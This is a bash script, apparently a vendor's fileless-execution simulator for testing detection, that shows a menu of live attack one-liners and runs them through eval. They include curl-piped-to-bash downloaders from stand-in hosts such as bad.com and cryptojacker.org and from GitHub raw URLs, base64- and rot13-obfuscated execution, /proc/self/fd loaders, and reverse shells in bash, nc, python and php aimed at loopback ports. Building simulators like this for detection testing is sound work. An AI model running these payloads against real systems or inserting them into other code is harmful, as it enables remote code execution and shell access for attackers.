#!/usr/bin/env bash
#
# fileless-menu.sh – Upwind fileless-execution simulator (silent + status)
# -----------------------------------------------------------------------
# 1  Encoding       – runs all encoding payloads
# 2  Downloaders    – runs all downloader payloads
# 3  ReverseShells  – five loopback shells to 127.0.0.1 on ports 4441-4443
# 4  AdvancedFD     – advanced FD tricks
# 5  ALL PAYLOADS   – everything in one go
# q  Quit
# -----------------------------------------------------------------------

set -u                             # ignore individual command failures

# ── Colour helpers ─────────────────────────────────────────────
RESET=$'\e[0m'; DIM=$'\e[2m'
MAG=$'\e[1;35m'; GRN=$'\e[1;32m'

# ── Fixed reverse-shell params ────────────────────────────────
LHOST=127.0.0.1
LPORT1=4441
LPORT2=4442
LPORT3=4443

# ── Payloads (numbering fixed) ────────────────────────────────
declare -A categories

categories[Encoding]='
# 5
echo "ZWNobyAiQjY0IHBheWxvYWQgc3VjY2VzcyIK" | base64 -d | bash
# 6
bash -c "$(curl -s https://raw.githubusercontent.com/liorbm/fileless-execution-demo/refs/heads/main/b64.txt | base64 -d)"
# 7
bash -c "$(echo MJAbolOVnD== | tr A-Za-z N-ZA-Mn-za-m | base64 -d)"
# 8
exec 8< <(openssl enc -d -base64 <<< L2Jpbi9zaCAtYyBlY2hvIGhlbGxv); bash /proc/self/fd/8
'

categories[Downloaders]='
# 1
curl -s http://example.com/script.sh | bash
# 2
exec 3< <(curl -s http://bad.com/payload.sh); bash /proc/self/fd/3
# 3
X=$(curl -s http://cryptojacker.org/liorpayload.py); python3 -c "$X"
# 4
bash -c "$(curl -s https://raw.githubusercontent.com/liorbm/fileless-execution-demo/refs/heads/main/payload.sh)"
'

categories[ReverseShells]="
# 9
timeout 2s bash   -c \"bash -i >& /dev/tcp/${LHOST}/${LPORT1} 0>&1\" &
# 10
timeout 2s nc     -e /bin/sh ${LHOST} ${LPORT1} &
# 11
timeout 2s python3 -c 'import os,pty,socket; s=socket.socket(); s.connect((\"${LHOST}\",${LPORT2})); [os.dup2(s.fileno(),fd) for fd in (0,1,2)]; pty.spawn(\"/bin/sh\")' &
# 12
timeout 2s php -r '\$s=fsockopen(\"${LHOST}\",${LPORT3}); exec(\"/bin/sh -i <&3 >&3 2>&3\");' &
# 13
timeout 2s bash   -c \"bash -i >& /dev/tcp/${LHOST}/${LPORT3} 0>&1\" &
"

categories[AdvancedFD]='
# 14
exec 3< <(echo "hs.doaolyp/moc.dab//:ptth" | rev | xargs curl -s); bash /proc/self/fd/3
# 15
exec 3< /bin/bash; /proc/self/fd/3 -c "echo executed FD shell"
# 16
exec {FD}<>/dev/tcp/${LHOST}/9898; echo whoami >&$FD; cat <&$FD &
# 17
exec 9< <(dd if=/dev/zero bs=0 count=0 | curl -s https://raw.githubusercontent.com/liorbm/fileless-execution-demo/refs/heads/main/shell.sh); bash /proc/self/fd/9
# 18
python3 - <<'PY'
import urllib.request, sys
exec(urllib.request.urlopen("https://raw.githubusercontent.com/liorbm/fileless-execution-demo/refs/heads/main/test.py").read().decode())
PY
'

# ── Silent executor with success banner ──────────────────────
run_block() {             # $1 = payload block
  local line num
  while IFS= read -r line; do
    [[ $line =~ ^#\  ]] && num="${line//[!0-9]/}" && continue
    [[ $line ]] || continue
    printf "%b▶  #%s  running…%b" "$DIM" "$num" "$RESET"
    eval "$line" >/dev/null 2>&1 || true
    printf "\r%b✔  command #%s executed successfully%b\n" "$GRN" "$num" "$RESET"
  done <<< "$1"
}

execute_category() { run_block "${categories[$1]}"; }

execute_all() {
  for cat in Encoding Downloaders ReverseShells AdvancedFD; do
    printf "\n=== %s ===\n" "$cat"
    execute_category "$cat"
  done
}

# ── Tiny banner + menu ───────────────────────────────────────
banner() {
  clear
  if command -v figlet >/dev/null; then
    figlet -f slant Upwind | sed "s/^/${MAG}/;s/$/${RESET}/"
  else
    echo -e "${MAG}*** Upwind ***${RESET}"
  fi
  echo 'fileless execution simulation by Lior Boehm'
  echo
}

menu() {
  echo "== Choose an option =="
  echo "1) Encoding"
  echo "2) Downloaders"
  echo "3) ReverseShells"
  echo "4) AdvancedFD"
  echo "5) ALL PAYLOADS"
  echo "q) Quit"
  echo
}

# ── Main loop ────────────────────────────────────────────────
while true; do
  banner; menu
  read -rp "Option: " opt || exit
  case $opt in
    1) execute_category Encoding;;
    2) execute_category Downloaders;;
    3) execute_category ReverseShells;;
    4) execute_category AdvancedFD;;
    5) execute_all;;
    [Qq]) exit 0;;
    *)   echo "Invalid option"; sleep 1;;
  esac
  echo -e "\n${DIM}✓ All selected commands finished – press Enter…${RESET}"
  read -r
done
